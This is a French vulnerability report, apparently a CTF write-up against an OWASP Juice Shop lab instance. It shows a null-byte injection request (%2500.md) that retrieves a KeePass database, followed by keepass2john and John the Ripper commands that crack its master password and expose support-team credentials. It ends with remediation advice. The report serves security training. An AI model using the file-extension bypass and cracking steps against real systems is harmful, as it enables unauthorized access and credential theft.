# Rapport de Vulnérabilité

## Vulnérabilité

| Champ                      | Détails                                                                 |
|----------------------------|-------------------------------------------------------------------------|
| **Type**                   | Exposition de base de mots de passe + Crack de mot de passe KeePass     |
| **Composant affecté**      | Endpoint FTP — `incident-support.kdbx`                                  |
| **Sévérité**               | 🔴 Critique                                                             |

---

## Méthodologie

### Techniques utilisées
- Énumération de fichiers exposés
- Crack de mot de passe (dictionnaire)
- Extraction de credentials depuis une base KeePass

### Outils utilisés

| Outil          | Objectif                                                         |
|----------------|------------------------------------------------------------------|
| Navigateur     | Récupération du fichier `incident-support.kdbx` via null byte    |
| keepass2john   | Extraction du hash du mot de passe maître KeePass                |
| John the Ripper | Crack du hash par attaque dictionnaire                          |
| KeePassXC      | Ouverture de la base avec le mot de passe cracké                 |

### Étapes

1. **Découverte du fichier** — En naviguant sur `/ftp/`, on identifie un fichier `incident-support.kdbx` — une base de données KeePass contenant des credentials de l'équipe support.

2. **Récupération via null byte** — Le fichier est téléchargé via la technique de null byte injection :
   ```
   GET /ftp/incident-support.kdbx%2500.md HTTP/2
   Host: ctf.juice.cyber.epitest.eu
   ```

3. **Extraction du hash** — On extrait le hash du mot de passe maître avec `keepass2john` :
   ```bash
   keepass2john incident-support.kdbx > hash.txt
   ```

4. **Crack du mot de passe** — Le hash est cracké par attaque dictionnaire avec John the Ripper :
   ```bash
   john --wordlist='fzf-wordlists' hash.txt
   ```

5. **Ouverture de la base** — Le mot de passe cracké est utilisé pour ouvrir `incident-support.kdbx` avec KeePassXC, révélant les credentials de l'équipe support.

6. **Connexion** — Les identifiants récupérés permettent de se connecter en tant que compte support sur l'application.

---

### Preuve de concept

**Récupération du fichier :**
```
GET /ftp/incident-support.kdbx%2500.md HTTP/2
Host: ctf.juice.cyber.epitest.eu
→ 200 OK — fichier .kdbx téléchargé
```

**Crack du mot de passe maître :**
```bash
# Extraction du hash
keepass2john incident-support.kdbx > hash.txt

# Crack par dictionnaire
john --wordlist='fzf-wordlists' hash.txt

# Affichage du résultat
john --show hash.txt
→ incident-support.kdbx:<mot_de_passe_trouvé>
```

**Ouverture et extraction des credentials :**
```bash
# Ouverture avec KeePassXC
keepassxc incident-support.kdbx
```

---

## Risques

### Impact

- **Compromission complète des comptes support** — tous les identifiants stockés dans la base KeePass sont exposés
- **Accès aux logs et données sensibles** — le compte support donne accès à `/support/logs` et aux données internes documentées précédemment
- **Pivot vers d'autres systèmes** — les credentials support peuvent être réutilisés sur d'autres services internes
- **Violation du RGPD** — accès non autorisé aux données personnelles des utilisateurs via le compte support

---

## Correction

### Correctifs

- Retirer immédiatement le fichier `incident-support.kdbx` du répertoire `/ftp/` — une base de mots de passe n'a jamais sa place dans un répertoire web accessible
- Utiliser un mot de passe maître KeePass long et aléatoire résistant aux attaques dictionnaire 
- Corréler avec le correctif du null byte injection pour bloquer l'accès aux fichiers `.kdbx` même si mal placés

### Bonnes pratiques de sécurité recommandées

- Suivre les directives OWASP Top 10
- Ne jamais stocker de gestionnaire de mots de passe dans un répertoire accessible via HTTP
- Appliquer une politique de mots de passe maître forts et auditer régulièrement leur robustesse